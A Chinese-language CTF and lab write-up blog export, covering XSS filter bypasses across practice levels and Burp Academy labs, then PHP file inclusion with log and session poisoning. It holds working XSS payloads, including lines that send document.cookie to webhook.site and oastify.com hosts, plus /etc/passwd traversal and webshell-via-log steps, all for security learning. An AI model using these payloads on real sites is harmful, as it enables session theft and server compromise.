&lt;script&gt;alert`1`&lt;/script&gt;

2.throw绕过
&lt;script&gt;alert;throw 1&lt;/script&gt;&lt;svg/onload=&quot;window.onerror=eval;throw&#x27;=alert\x281\x29&#x27;;&quot;&gt;

单引号过滤1.可以利用斜杠替换
&lt;script&gt;alert(/Evi1s7/)&lt;/script&gt;

2.利用反引号替换
&lt;script&gt;alert(`Evi1s7`)&lt;/script&gt;

长度限制可以利用拆分法
&lt;script&gt;a=&#x27;document.write(&quot;&#x27;&lt;/script&gt;&lt;script&gt;a=a+&#x27;&lt;a href=ht&#x27;&lt;/script&gt;&lt;script&gt;a=a+&#x27;tp://VPS-IP:po&#x27;&lt;/script&gt;&lt;script&gt;a=a+&#x27;rt&gt;Evi1s7&lt;/a&gt;&quot;)&#x27;&lt;/script&gt;&lt;script&gt;eval(a)&lt;/script&gt;

利用eval()函数将字符串解析为可执行的代码，从而进行拼接
document.write(&quot;&lt;a href=http://VPS-IP:port&gt;Evi1s7&lt;/a&gt;&quot;)

分号绕过当只过滤了分号时，可以利用花括号进行语句隔离
&lt;script&gt;&#123;onerror=alert&#125;throw 1&lt;/script&gt;

xss挑战之旅靶场：http://test.ctf8.com/
level-1&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;name&quot;];echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;?&gt;

没有任何过滤，直接：/level1.php?name=&lt;script&gt;alert(1)&lt;/script&gt;，弹出弹窗，进入下一关
level-2$str = $_GET[&quot;keyword&quot;];echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form action=level2.php method=GET&gt;&lt;input name=keyword  value=&quot;&#x27;.$str.&#x27;&quot;&gt;&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;

$str被双引号包含，所以我们需要先包含双引号后再xss：&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;，或者 &quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;&quot; 弹出弹窗，进入下一关
level-3$str = $_GET[&quot;keyword&quot;];echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;&lt;form action=level3.php method=GET&gt;&lt;input name=keyword  value=&#x27;&quot;.htmlspecialchars($str).&quot;&#x27;&gt;

payload：&#39;onclick=&#39;alert(1)r然后再点击一下输入框就成功了
&lt;input name=keyword  value=&#x27;&#x27;onclick=&#x27;alert(1)&#x27;&gt;

level-4$str = $_GET[&quot;keyword&quot;];$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form action=level4.php method=GET&gt;&lt;input name=keyword  value=&quot;&#x27;.$str3.&#x27;&quot;&gt;

payload：&quot;onclick=&quot;alert(1)
level-5$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form action=level5.php method=GET&gt;&lt;input name=keyword  value=&quot;&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;&quot;&gt;

payload：&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;，利用浏览器自动校正轻微语法错误
level-6$str = $_GET[&quot;keyword&quot;];$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form action=level6.php method=GET&gt;&lt;input name=keyword  value=&quot;&#x27;.$str6.&#x27;&quot;&gt;

该题有多种payload，基本上只要把前几题改下大小写就可以了
level-7$str =strtolower( $_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);$str4=str_replace(&quot;rcs&quot;,&quot;&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form action=level7.php method=GET&gt;&lt;input name=keyword  value=&quot;&#x27;.$str6.&#x27;&quot;&gt;

全转换成小写了，大小写不管用，但是可以双写绕过：&quot;&gt;&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;&lt;&quot;
level-8（HTML实体绕过）$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace(&#x27;&quot;&#x27;,&#x27;&amp;quot&#x27;,$str6);echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;.$str7.&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;

可以用HTML实体来绕过过滤: &amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;
HTML实体：字符实体是用一个编号写入HTML代码中来代替一个字符，在使用浏览器访问网页时会将这个编号解析还原为字符以供阅读
level-9（http）$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace(&#x27;&quot;&#x27;,&#x27;&amp;quot&#x27;,$str6);if(false===strpos($str7,&#x27;http://&#x27;))&#123;echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;&#125;else&#123;echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;.$str7.&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;&#125;

在上题的基础上再添上 //http://就可以了
&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;//http://

level-10$str = $_GET[&quot;keyword&quot;];$str11 = $_GET[&quot;t_sort&quot;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;

当一个input元素里面有两个type时，那么只有第一个 type 属性会被浏览器解析，而第二个 type 属性会被忽略
payload：t_sort=&quot;type=&quot;text&quot;onclick=&quot;alert(1)
level-11$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_SERVER[&#x27;HTTP_REFERER&#x27;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;.htmlspecialchars($str00).&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;

在referer里面进行修改就行：&quot;type=&quot;text&quot;onclick=&quot;alert(1)
level-12和上题不同的是要在User-Agent里面改
level-13这题在cookie里面改就可以了
&quot;type=&quot;text&quot;onclick=&quot;alert(1)或者&quot; type=&quot;text&quot; onmousemove=&quot;alert(1)

level-14考到了杂项，不会
level-15（文件包含）&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;src&quot;];echo &#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;;?&gt;

ng-include指令用于包含外部的 HTML 文件。包含的内容将作为指定元素的子节点。
ng-include属性的值可以是一个表达式，返回一个文件名。默认情况下，包含的文件需要包含在同一个域名下
所以这题我们只需要包含第一题的漏洞就好了：src=&#39;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#39;
level-16（替换空格）$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot; &quot;,$str);$str3=str_replace(&quot; &quot;,&quot; &quot;,$str2);$str4=str_replace(&quot;/&quot;,&quot; &quot;,$str3);$str5=str_replace(&quot;	&quot;,&quot; &quot;,$str4);echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;

1、“0D”是把光标移到同一行的顶头——回车(CR)。
2、“0A”是把光标移到下一行——换行(LF)。
3、用“&#x2F;”代替空格
使用替身，就是将%0a或者%0D当成空格使用，在HTML中这样是合法的
payload：&lt;img%0dsrc=1%0donerror=alert(1)&gt;
CTF.showweb316-web319除了316外后面几题过滤了 &lt;javascript&gt;，所以解题如下：
&lt;body onload=&quot;window.open(&#x27;https://webhook.site/346c0b70-1254-4efc-a539-54c670644ab2/?a=&#x27;+document.cookie)&quot;&gt;

web320-web326可以通过在输入框输入一串字符（比如：我输入了script），然后查看回显，有回显说明没有被过滤掉，无回显说明被过滤掉了
web320:
通过查看网址发现空格被替换成了加号，过滤了空格，可以用&#x2F;或者&#x2F;**&#x2F;来代替空格，所以解题如下：
&lt;body onload=&quot;window.open(&#x27;https://webhook.site/346c0b70-1254-4efc-a539-54c670644ab2/?a=&#x27;+document.cookie)&quot;&gt;

后面几题都可以用上述的方法
web327发信人必须是admin，然后信的内容是xss的内容就好了
CTFHub-XSS反射型
该题没有任何过滤，最开始我只在第一行里面构造xss，payload如下：
&lt;script&gt;window.location.href=`https://pxq8pofmxik8gq7hg445ctw5jwpnde13.oastify.com/?$&#123;document.cookie&#125;`&lt;/script&gt;

提交之后确实会访问该网站但是查bp的时候发现没有任何的cookie，后面再看眼页面发现需要利用第二行发送一个url给Bot，所以如下：
http://challenge-fe994fbb8a6a0602.sandbox.ctfhub.com:10800/?name=&lt;script&gt;window.location.href=`https://pxq8pofmxik8gq7hg445ctw5jwpnde13.oastify.com/?$&#123;document.cookie&#125;`&lt;/script&gt;

发送后在bp查看获取flag
过滤空格只要空格变为 /**/就好啦
bp实验室Lab: DOM XSS in innerHTML sink using source location.search本实验在搜索博客功能中包含一个基于 DOM 的跨站点脚本漏洞。它使用赋 innerHTML 值，该赋值使用来自 location.search 的数据更改 div 元素的 HTML 内容
最开始在搜索框中输入 &lt;script&gt;alert(1)&lt;/script&gt;的时候，并没有成功执行，通过hackbar查看元素的时候发现该行代码成功注入，但是没有执行（后面看解析视频的时候说是因为同步的问题，浏览器的自我保护机制）
于是我们再思考思考有什么是可以被执行的，即img元素，我们运用的也仅仅是一个报错罢了，所以尝试在输入框内输入 &lt;img src=1 onerror=alert(1)&gt;，点击发送，页面成功回显alert，于是通过这个方法我们也可以执行任意的js代码来达到我们的目的
Lab: DOM XSS in jQuery anchor href attribute sink using location.search source该题先是尝试了在评论区里面评论以及提交反馈处xss，但是都失败了，后面查看了一下提交反馈界面的源码，发现了以下代码：
&lt;script&gt;	$(function() &#123;    	$(&#x27;#backLink&#x27;).attr(&quot;href&quot;, (new URLSearchParams(window.location.search)).get(&#x27;returnPath&#x27;));	&#125;);&lt;/script&gt;


$(function() &#123; ... &#125;): 这是jQuery中的一种文档就绪函数，即在DOM加载完成后执行其中的代码。它等价于JavaScript中的document.addEventListener(&#39;DOMContentLoaded&#39;, function() &#123; ... &#125;)。
$(&#39;#backLink&#39;): 这是jQuery选择器，用于选取id为”backLink”的元素。
.attr(&quot;href&quot;, ...): 这是jQuery中用于设置元素属性的方法。在这里，它设置了id为”backLink”的元素的href属性。
(new URLSearchParams(window.location.search)).get(&#39;returnPath&#39;): 这一部分使用了JavaScript中的URLSearchParams对象来获取当前页面URL中查询参数”returnPath”的值。首先，通过window.location.search获取当前页面URL的查询参数部分，然后使用URLSearchParams对象来解析这个查询参数字符串，最后调用.get(&#39;returnPath&#39;)方法获取名为”returnPath”的参数的值。

看到网址处：https://0aa3002e043a24f88b20e4c8006c0026.web-security-academy.net/feedback?returnPath=/尝试性在后面输入 abc123，检查back按键发现输入内容已经进入了href后面，如下：

于是我们把输入的内容改为：javascript:alert(document.cookie)，然后再点击back按键，解决问题
Lab: DOM XSS in jQuery selector sink using a hashchange event要求：要解决该实验室问题，请向受害者提供一个漏洞利用程序，在其浏览器中调用 print() 函数
进入实验室，查看源代码，js代码如下：
 $(window).on(&#x27;hashchange&#x27;, function()&#123;	var post = $(&#x27;section.blog-list h2:contains(&#x27; + decodeURIComponent(window.location.hash.slice(1)) + &#x27;)&#x27;);	if (post) post.get(0).scrollIntoView();&#125;);

这段代码是用jQuery编写的，监听浏览器URL中哈希值（#后面的部分）的变化，当哈希值发生变化时，它会查找页面上带有特定标题的元素，并将页面滚动到该元素位置。
具体来说：

$(window).on(&#39;hashchange&#39;, function()&#123;...&#125;);：这一行代码是当浏览器URL的哈希值发生变化时触发的事件处理程序。
var post = $(&#39;section.blog-list h2:contains(&#39; + decodeURIComponent(window.location.hash.slice(1)) + &#39;)&#39;);：这一行代码是查找页面上包含特定标题的元素。它首先解码哈希值（由decodeURIComponent()函数完成），然后使用选择器section.blog-list h2:contains(...)查找带有指定标题的&lt;h2&gt;元素。查找结果将被存储在变量post中。
if (post) post.get(0).scrollIntoView();：这一行代码是将页面滚动到包含特定标题的元素处。它首先检查是否找到了符合条件的元素（通过检查post变量是否存在），如果找到了，则使用scrollIntoView()方法将其滚动到可见区域。

这段代码的功能是让页面在加载后根据URL中的哈希值自动滚动到对应标题的部分
页面源码中的h2元素就是文章的标题
网上找到的关于此函数的相关漏洞链接：https://bugs.jquery.com/ticket/9521/
发现了有意思的地方如下：
&quot;$(location.hash)&quot; expected CSS selector in many case, but this code also can create html element.“$(location.hash)”在很多情况下都需要 CSS 选择器，但此代码也可以创建 html 元素。

上面的意思就是说如果未找到css选择器中要查找的元素，那么会自动创建html元素
这样子的话我们可以直接在#后面加上js代码：https://0a3200c703b1b8bf81aed57300fd0044.web-security-academy.net/#&lt;img src=x onerror=print()&gt;，点击回车会有弹窗出现，但是只能够触发一次，下一次就失败，无法访问网站，所以直接把该链接给受害者的办法是行不通的，需要换一种思路：首先加载https://0a3200c703b1b8bf81aed57300fd0044.web-security-academy.net/#，然后我们再把payload加载到该url中，这样便可以触发一次哈希更改事件
所以我们在bp提供的漏洞利用程序中的body部分可以这样写到：
&lt;iframe src=&quot;https://YOUR-LAB-ID.web-security-academy.net/#&quot; onload=&quot;this.src+=&#x27;&lt;img src=x onerror=print()&gt;&#x27;&quot;&gt;&lt;/iframe&gt;

测试该漏洞成功，把它发给受害者，题目解决
Lab：将 XSS 反射到带有尖括号 HTML 编码的属性中要求：此实验室在搜索博客功能中包含一个反映的跨站点脚本漏洞，其中尖括号是 HTML 编码的。要完成此实验，请执行跨站点脚本攻击，注入属性并调用 alert 函数
在搜索框处随机输入一串字符，然后检查元素，如下：
&lt;input type=&quot;text&quot; placeholder=&quot;Search the blog...&quot; name=&quot;search&quot; value=&quot;ilbxoiusagxui&quot;&gt;

于是我们可以尝试逃出双引号，首先尝试输入：&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;&quot;，失败，检查元素，发现特殊符号被转化为HTML实体，
接着尝试：&quot;onload=&quot;alert(1)，失败，没有弹窗
接着尝试另一种方法：&quot;onmouseover=&quot;alert(1)，鼠标经过相关元素，弹窗成功，题目解决
Lab：将 XSS 存储到带有双引号 HTML 编码的锚点 href 属性中要求：该实验在评论功能中包含一个存储的跨站点脚本漏洞。要完成此实验，请提交一条评论，该评论在单击评论作者姓名时调用 alert 函数
随便点进一篇文章，先随便提交一条评论，接着返回查看评论，如下：

点击评论者名字的话会自动跳转到你输入进去的网址
所以我们有了思路，在写评论中让你输入网址的地方利用js伪协议，输入：javascript:alert(1)，提交评论，题目解决
（url的组成是协议加上地址，所以我们用js伪协议可以成功）
Lab：将 XSS 反射到带有尖括号 HTML 编码的 JavaScript 字符串中要求：此实验室在尖括号编码的搜索查询跟踪功能中包含反映的跨站点脚本漏洞。反射发生在 JavaScript 字符串内。要完成本实验，请执行跨站点脚本攻击，突破 JavaScript 字符串并调用 alert 函数
在搜索栏中搜索文章名字后，右键检查元素，发现了相关的js代码如下：
&lt;script&gt;var searchTerms = &#x27;125&#x27;;document.write(&#x27;&lt;img src=&quot;/resources/images/tracker.gif?searchTerms=&#x27;+encodeURIComponent(searchTerms)+&#x27;&quot;&gt;&#x27;);&lt;/script&gt;

最开始的思路被题目带歪了，一直在思考着怎么突破下面的双引号包括，当然最终的尝试以失败告终
然后就没有思路，开始看下面的讲解视频，发现他是突破上面变量searchTerms的单引号包括，恍然大悟
进行尝试：&#39;;alert(1);&#39;尝试失败，但是成功逃脱了单引号包括，要解决的就是后面遗留的&#39;;
所以我们可以自己再创造一个变量出来解决这个问题：&#39;;alert(1);let word=&#39;
题目解决
不得不说思路得扩大一点，不能只局限于一处，要多看看其他地方有没有可以突破的地方
Lab： document.write 接收器中的 DOM XSS 使用选择元素内的源 location.search要求：此实验室在股票检查器功能中包含基于 DOM 的跨站点脚本漏洞。它使用 JavaScript document.write 函数，将数据写入页面。 document.write 函数使用来自 location.search 的数据进行调用，您可以使用网站 URL 进行控制。数据包含在选择元素内。要完成此实验，请执行跨站点脚本攻击，该攻击会突破 select 元素并调用 alert 函数
相关的js代码如下：
&lt;script&gt;var stores = [&quot;London&quot;,&quot;Paris&quot;,&quot;Milan&quot;];var store = (new URLSearchParams(window.location.search)).get(&#x27;storeId&#x27;);document.write(&#x27;&lt;select name=&quot;storeId&quot;&gt;&#x27;);if(store) &#123;	document.write(&#x27;&lt;option selected&gt;&#x27;+store+&#x27;&lt;/option&gt;&#x27;);&#125;for(var i=0;i&lt;stores.length;i++) &#123;	if(stores[i] === store) &#123;		continue;	&#125;	document.write(&#x27;&lt;option&gt;&#x27;+stores[i]+&#x27;&lt;/option&gt;&#x27;);&#125;document.write(&#x27;&lt;/select&gt;&#x27;);&lt;/script&gt;

这段 JavaScript 代码创建了一个 &lt;select&gt; 元素，其中包含了一组商店名称作为选项。它还根据 URL 查询参数中的 storeId 值选择了一个默认选项。
让我们逐行解释代码的功能：

var stores = [&quot;London&quot;,&quot;Paris&quot;,&quot;Milan&quot;];：定义了一个包含商店名称的数组。
var store = (new URLSearchParams(window.location.search)).get(&#39;storeId&#39;);：使用 URLSearchParams 获取了当前页面 URL 查询参数中名为 storeId 的值，并将其存储在 store 变量中。
document.write(&#39;&lt;select name=&quot;storeId&quot;&gt;&#39;);：使用 document.write() 方法输出了一个 &lt;select&gt; 元素的开始标签。
if (store) &#123; ... &#125;：检查是否存在 storeId 参数。如果存在，就在 &lt;select&gt; 中添加一个被选中的选项，显示当前的 storeId 值。
for (var i = 0; i &lt; stores.length; i++) &#123; ... &#125;：遍历商店数组，对每个商店创建一个 &lt;option&gt; 元素，并将其添加到 &lt;select&gt; 中。
document.write(&#39;&lt;/select&gt;&#39;);：输出 &lt;select&gt; 元素的结束标签。

通过这段代码，你可以在页面上创建一个下拉菜单，其中包含了预定义的商店选项，并且可以根据 URL 中的 storeId 参数自动选择默认选项
于是我们尝试在url中添加参数：https://0a9a006303a2363184429b37009500d5.web-security-academy.net/product?productId=1&amp;storeId=sherlock，然后回车，检查元素，变化如下：
&lt;select name=&quot;storeId&quot;&gt;	&lt;option selected=&quot;&quot;&gt;sherlock&lt;/option&gt;	&lt;option&gt;London&lt;/option&gt;	&lt;option&gt;Paris&lt;/option&gt;	&lt;option&gt;Milan&lt;/option&gt;&lt;/select&gt;

题目告诉我们说要突破select标签，所以我们可以让它提前闭合，payload如下：
storeId=sherlock&lt;/select&gt;&lt;img src=&quot;1&quot; onerror=alert(1)&gt;后面未闭合的标签我们不需要去管，浏览器会自动修复，回车后如下
&lt;select name=&quot;storeId&quot;&gt;	&lt;option selected=&quot;&quot;&gt;sherlock&lt;/option&gt;&lt;/select&gt;&lt;img src=&quot;1&quot; onerror=&quot;alert(1)&quot;&gt;&lt;option&gt;London&lt;/option&gt;&lt;option&gt;Paris&lt;/option&gt;&lt;option&gt;Milan&lt;/option&gt;

题目解决
Lab：AngularJS 表达式中的 DOM XSS，带有尖括号和双引号 HTML 编码该实验在搜索功能中的 AngularJS 表达式中包含基于 DOM 的跨站点脚本漏洞。AngularJS 是一个流行的 JavaScript 库，它扫描包含 ng-app 属性（也称为 AngularJS 指令）的 HTML 节点的内容。当指令添加到 HTML 代码中时，您可以执行双花括号内的 JavaScript 表达式。当对尖括号进行编码时，此技术非常有用。要完成此实验，请执行跨站点脚本攻击，该攻击执行 AngularJS 表达式并调用 alert 函数

根据题目提供的相关描述，在谷歌上面进行搜索，得到了一篇相关的非常有用的文章：https://nosec.org/home/detail/4153.html
由于尖括号被编码了，所以我们不能使用相关特殊字符，便尝试用双花括号
首先输入&#123;&#123;1+1&#125;&#125;：输出为2，表明应用很容易受到客户端模板注入的影响
默认情况下，作用域对象包含另一个名为“构造器”的对象，该对象包含一个也被称为“构造器”的函数。此函数可用于动态生成和执行代码。而这正是我们执行XSS的payload所需要的
所以构造payload为：&#123;&#123;constructor.constructor('alert(1)')()&#125;&#125;
题目解决
Lab：反射型 DOM XSS本实验演示了反射 DOM 漏洞。当服务器端应用程序处理请求中的数据并在响应中回显数据时，就会出现反射 DOM 漏洞。然后，页面上的脚本以不安全的方式处理反射的数据，最终将其写入危险的接收器。要完成本实验，请创建一个调用 alert() 函数的注入
先打开burpsuite，进入实验室后打开proxy，然后在搜索框中随便输入字符串（比如xss），到bp的代理的url历史中找到/search-results?search=xss，把它发送到repeater中，该条目具体内容如下：

我们可以尝试突破双引号包括，即xss&quot;-alert(1)&#125;//，发现行不通，双引号会自动被转义，于是我们可以自己先给它加个转义，而转义符也是可以被转义的，这样子我们就可以突破双引号了，payload为：xss\&quot;-alert(1)&#125;//，如下：

成功逃脱，弹窗成功，题目解决
payload中-的作用：- 后面的内容 alert(1) 是一个 JavaScript 代码片段，它尝试执行一个弹窗警告框。然而，在这种情况下，这段代码被包含在双引号 &quot; 中，并且在外面包裹了反斜杠 \。这样做是为了避免 JSON 格式出错，因为双引号和反斜杠都是 JSON 字符串中的特殊字符，需要进行转义处理。
总之，- 的作用是对搜索条件进行逻辑操作，而这个搜索条件中包含了一个被排除的 JavaScript 代码片段
Lab：存储的 DOM XSS按照上一题的思路来做，同样的评论部分都为json文件，观察到name位于最后的位置，于是按照上题在name输入框可以这样写：xss\&quot;-alert(1)&#125;]//，回车之后发现并没有奏效
检查响应，发现给\&quot;分别都做了转义处理，于是失败了
查看题解，payload是写在评论的内容中：&lt;&gt;&lt;img src=1 onerror=alert(1)&gt;，回车后点返回到博文，成功弹窗，题目解决
根据题解所说，这样子之所以可以奏效是因为为了防止 XSS，该网站使用 JavaScript replace() 函数对尖括号进行编码。但是，当第一个参数是字符串时，该函数仅替换第一个匹配项。我们利用此漏洞只需在评论的开头添加一组额外的尖括号即可。这些尖括号将被编码，但任何后续的尖括号都不会受到影响，使我们能够有效地绕过过滤器并注入 HTML
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>php伪代码协议和文件包含</title>
    <url>/2023/12/18/php%E4%BC%AA%E4%BB%A3%E7%A0%81%E5%8D%8F%E8%AE%AE%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB_max/php%E4%BC%AA%E4%BB%A3%E7%A0%81%E5%8D%8F%E8%AE%AE%E5%92%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[文件包含include和require语句在 PHP 中，您可以在服务器执行 PHP 文件之前在该文件中插入一个文件的内容。
include 和 require 语句用于在执行流中插入写在其他文件中的有用的代码。
include 和 require 除了处理错误的方式不同之外，在其他方面都是相同的：

require 生成一个致命错误（E_COMPILE_ERROR），在错误发生后脚本会停止执行。
include 生成一个警告（E_WARNING），在错误发生后脚本会继续执行。

因此，如果您希望继续执行，并向用户输出结果，即使包含文件已丢失，那么请使用 include。否则，在框架、CMS 或者复杂的 PHP 应用程序编程中，请始终使用 require 向执行流引用关键文件。这有助于提高应用程序的安全性和完整性，在某个关键文件意外丢失的情况下。
包含文件省去了大量的工作。这意味着您可以为所有网页创建标准页头、页脚或者菜单文件。然后，在页头需要更新时，您只需更新这个页头包含文件即可。
基础语法：
include &#x27;filename&#x27;;或者require &#x27;filename&#x27;;


Include_once：系统会自动判断文件包含过程中，是否已经包含过（一个文件最多被包含一次）
Requuire_once:与Include_once相同

注意：

require 一般放在 PHP 文件的最前面，程序在执行前就会先导入要引用的文件；
include 一般放在程序的流程控制中，当程序执行时碰到才会引用，简化程序的执行流程。

判断是否有文件包含通过 /etc/passwd来查看是否有文件包含（前面那个基本上所有Linux文件都会包含）
例子： /flag/../../../../../../etc/passwd只要 ../够多就肯定会到根目录处
日志包含漏洞前置知识点
apache默认日志路径 /var/log/apache2/access.log
nginx默认日志路径 /var/log/nginx/access.log
phpinfo()函数
作用：显示出PHP 所有相关信息。是排查配置php是是否出错或漏配置模块的主要方式之一
&lt;?php phpinfo(); ?&gt;

 只要访问到phpinfo()函数的web页面，即返回php的所有相关信息！
eval()函数
作用：eval()函数把括号里面内容按照php代码处理
例子
echo &quot;我想学php&quot;echo &#x27;echo &quot;我想学php&quot;&#x27;; //输出echo &quot;我想学php&quot;eval(&#x27;echo &quot;我想学php&quot;;&#x27;); //输出&quot;我想学php&quot;

注意事项：eval函数括号中字符串末尾一定要有分号。使用技巧：把php代码当成当成字符串原样输出，若能正常输出，再放到eval（）函数中；
system()函数
执行外部程序并显示输出资料。
system语法: string system(string command, int [return_var]);
system返回值: 字符串

日志包含漏洞原因：某php文件存在本地文件包含漏洞，但无法上传文件，利用包含漏洞包含Apache(看服务器是Apache还是nginx)日志文件也可以获取WebShell
注意：需要开启服务器记录日志功能
访问日志的位置和文件名在不同的系统上会有所差异
apache一般是&#x2F;var&#x2F;log&#x2F;apache&#x2F;access.log。：
nginx的log在&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log和&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log
Apache运行后一般默认会生成两个日志文件，这两个文件是access.log(访问日志)和error.log(错误日志)，Apache的访问日志文件记录了客户端的每次请求及服务器响应的相关信息。当访问一个不存在的资源时，Apache日志同样会记录 例如访问http://127.0.0.1/。Apache会记录请求“”，并写到access.log文件中，这时候去包含access.log就可以利用包含漏洞
但并不能直接利用，原因是直接访问URL后，一句话木马在日志文件中被编码了 需要通过burpsuite拦截直接访问http://127.0.0.1/ 就能生成包含一句话木马的access.log文件
1.下面是文件包含漏洞代码：
&lt;?phpecho &#x27;file inlcude test&#x27;;if(isset($_GET[&#x27;rj45&#x27;]))&#123;	include($_GET[&#x27;rj45&#x27;]);&#125;?&gt;

2.写入phpinfo()

3.写入一句话

其中 dir就是查看当前目录下的文件和文件夹列表
session包含如何利用当Session文件的内容可控，并且可以获取Session文件的路径，就可以通过包含Session文件进行攻击。
Session的存储位置获取：一般是通过以下两种方式。
（1）通过phpinfo的信息可以获取到Session的存储位置。phpinfo中的session.save_path存储的是Session的存放位置。通过phpinfo的信息获取到session.save_path一般为/var/lib/php/session。
